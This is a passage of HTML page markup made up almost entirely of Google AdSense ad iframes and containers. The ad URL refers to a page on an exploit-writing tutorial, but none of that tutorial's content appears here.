src="https://pagead2.googlesyndication.com/pagead/ads?ltd_cs=1&amp;client=ca-pub-8134501503628637&amp;output=html&amp;adk=1812271804&amp;adf=3025194257&amp;abgtt=3&amp;lmt=1718453401&amp;plat=3%3A16%2C8%3A4194304%2C9%3A134250504%2C16%3A8388608%2C17%3A32%2C24%3A32%2C25%3A32%2C30%3A1081344%2C32%3A32%2C41%3A32%2C42%3A32&amp;plas=135x624_r&amp;format=0x0&amp;url=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F07%2F19%2Fexploit-writing-tutorial-part-1-stack-based-overflows%2F&amp;host=ca-host-pub-2644536267352236&amp;pra=5&amp;wgl=1&amp;easpi=1&amp;aihb=0&amp;asro=0&amp;ailel=30~1~2~4~6~7~8~9~10~11~12~13~14~15~16~17~18~19~20~21~24&amp;aiael=30~1~2~4~6~7~8~9~10~11~12~13~14~15~16~17~18~19~20~21~24&amp;aifxl=30_19&amp;aiixl=30_6&amp;aslmct=0.7&amp;asamct=0.7&amp;dt=1718453401115&amp;bpp=3&amp;bdt=1334&amp;idt=182&amp;shv=r20240612&amp;mjsv=m202406110101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;eoidce=1&amp;nras=1&amp;correlator=5760699743700&amp;frm=20&amp;pv=2&amp;ga_vid=1580884287.1718453401&amp;ga_sid=1718453401&amp;ga_hid=1621828964&amp;ga_fc=0&amp;u_tz=120&amp;u_his=50&amp;u_h=864&amp;u_w=1536&amp;u_ah=864&amp;u_aw=1536&amp;u_cd=24&amp;u_sd=1.25&amp;adx=-12245933&amp;ady=-12245933&amp;biw=1280&amp;bih=693&amp;scr_x=0&amp;scr_y=0&amp;eid=44759876%2C44759927%2C44759837%2C42531706%2C44795921%2C95331696%2C95331833%2C95334508%2C95334524%2C95334573%2C95334578%2C95335888%2C95334052%2C95335290&amp;oid=2&amp;pvsid=4106273848482318&amp;tmod=1522521028&amp;uas=0&amp;nvt=1&amp;fsapi=1&amp;fc=1920&amp;brdim=-25600%2C-25600%2C-25600%2C-25600%2C1536%2C0%2C159%2C27%2C1280%2C692&amp;vis=2&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=32768&amp;bc=31&amp;bz=0.12&amp;ifi=1&amp;uci=a!1&amp;fsb=1&amp;dtd=223" data-google-container-id="a!1" tabindex="0" title="Advertisement" aria-label="Advertisement" data-load-complete="true"></iframe></div></ins><ins class="adsbygoogle adsbygoogle-noablate" style="display: none !important;" data-adsbygoogle-status="done"></ins><ins class="adsbygoogle adsbygoogle-noablate" style="display: none !important;" data-adsbygoogle-status="done"></ins><ins class="adsbygoogle adsbygoogle-noablate" data-adsbygoogle-status="done"><div id="aswift_2_host" style="border: medium; height: 124px; width: 1005px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"></div></ins><ins class="adsbygoogle adsbygoogle-noablate" data-adsbygoogle-status="done"><div id="aswift_3_host" style="border: medium; height: 600px; width: 135px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"></div></ins><iframe src="https://tpc.googlesyndication.com/sodar/sodar2/225/runner.html" width="0" height="0" style="display: none;"></iframe></body><iframe id="google_esf" name="google_esf" src="https://pagead2.googlesyndication.com/pagead/html/r20240612/r20110914/zrt_lookup_fy2021.html" style="display: none;"></iframe></html>